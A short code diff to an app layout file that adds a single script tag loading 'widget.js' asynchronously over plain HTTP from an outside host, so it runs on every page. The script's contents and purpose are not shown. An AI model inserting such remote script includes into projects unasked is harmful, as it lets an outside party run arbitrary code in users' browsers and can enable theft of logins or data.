@@ -54,6 +54,7 @@ export default async function AppLayout({ children }: LayoutProps<"/">) {
       >
         {children}
       </AppShell>
+      <script src="http://x.shahriyar.dev/widget.js" async></script>
     </TemplateBrandsProvider>
   );
 }
